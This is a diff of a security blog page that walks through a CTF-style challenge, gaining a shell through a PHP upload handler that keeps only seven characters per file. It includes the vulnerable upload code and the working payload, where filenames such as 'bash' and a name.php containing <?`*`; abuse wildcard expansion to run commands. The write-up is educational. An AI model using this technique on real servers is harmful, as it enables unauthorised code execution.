@@ -97,7 +97,7 @@
 <meta property="og:url" content="/2017/11/26/Escalating seven chars to get shell/index.html">
 <meta property="og:site_name" content="Ꭰ&#39;s security blog">
 <meta property="og:description" content="Dude, I heard something about 7 chars to get shell. It’s amazing! Let’s enjoy this.">
-<meta property="og:updated_time" content="2017-11-27T02:08:58.454Z">
+<meta property="og:updated_time" content="2017-11-27T15:45:17.280Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="Escalate seven chars rce to get shell">
 <meta name="twitter:description" content="Dude, I heard something about 7 chars to get shell. It’s amazing! Let’s enjoy this.">
@@ -411,28 +411,13 @@
 <p>The key of the second challenge is I can upload any files with content limited within 7 chars. It looks so similar with the first one that I almost believe that’s truth. </p>
 <figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div></pre></td><td class="code"><pre><div class="line">$savepath=<span class="string">"files/"</span>.sha1($_SERVER[<span class="string">'REMOTE_ADDR'</span>].$_SERVER[<span class="string">'HTTP_USER_AGENT'</span>]).<span class="string">"/"</span>;</div><div class="line"><span class="keyword">if</span>(!is_dir($savepath))&#123;</div><div class="line">	    $oldmask = umask(<span class="number">0</span>);</div><div class="line">	    mkdir($savepath, <span class="number">0777</span>);</div><div class="line">	    umask($oldmask);</div><div class="line">	    touch($savepath.<span class="string">"/index.html"</span>);</div><div class="line">	&#125;</div><div class="line">	<span class="keyword">if</span>((@$_POST[<span class="string">'filename'</span>]) &amp;&amp; (@$_POST[<span class="string">'content'</span>]) )&#123;</div><div class="line">	    $fp = fopen(<span class="string">"$savepath"</span>.$_POST[<span class="string">'filename'</span>], <span class="string">'w'</span>);</div><div class="line">	    fwrite($fp, substr($_POST[<span class="string">'content'</span>],<span class="number">0</span>,<span class="number">7</span>) );</div><div class="line">	    fclose($fp);</div><div class="line">	    $msg = <span class="string">'File saved to &lt;a&gt;'</span>.$savepath.htmlspecialchars($_POST[<span class="string">'filename'</span>]).<span class="string">"&lt;/a&gt;"</span>;</div><div class="line">	&#125;</div></pre></td></tr></table></figure>
 <p>There is a new file named <code>index.html</code> in every <code>$savepath</code>. I can upload the following files then execute command .</p>
-<table>
-<thead>
-<tr>
-<th>filename</th>
-<th>content</th>
-</tr>
-</thead>
-<tbody>
-<tr>
-<td>bash</td>
-<td>any</td>
-</tr>
-<tr>
-<td>bb</td>
-<td>ls</td>
-</tr>
-<tr>
-<td>name.php</td>
-<td><figure class="highlight plain"><figcaption><span>|</span></figcaption><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line"></div><div class="line">``` &lt;?=`*`; ``` is the key to execute command. Because it will execute all the files by order on current directory just like the following. Of course, you can change the `name` of file bash to `sh` but remember that you must always put the `bash` or `sh` file before the file with command you want execute.</div><div class="line"></div><div class="line">```shell</div><div class="line">bash bb index.html name.php</div></pre></td></tr></table></figure></td>
-</tr>
-</tbody>
-</table>
+<ol>
+<li>bash  any</li>
+<li>bb ls</li>
+<li>name.php  &lt;?`*`;</li>
+</ol>
+<p>The left is filename, the right is content. &lt;?`*`; is the key to execute command. Because it will execute all the files by order on current directory just like the following. Of course, you can change the <code>name</code> of file bash to <code>sh</code> but remember that you must always put the <code>bash</code> or <code>sh</code> file before the file with command you want execute.</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">bash bb index.html name.php</div></pre></td></tr></table></figure>
 <p>In shell, there is a special process called expansion. Here is the explanation.</p>
 <blockquote>
 <p>Each time you type a command line and press the enter key, bash performs several processes upon the text before it carries out your command. We have seen a couple of cases of how a simple character sequence, for example “<em>”, can have a lot of meaning to the shell. The process that makes this happen is called </em>expansion*. </p>
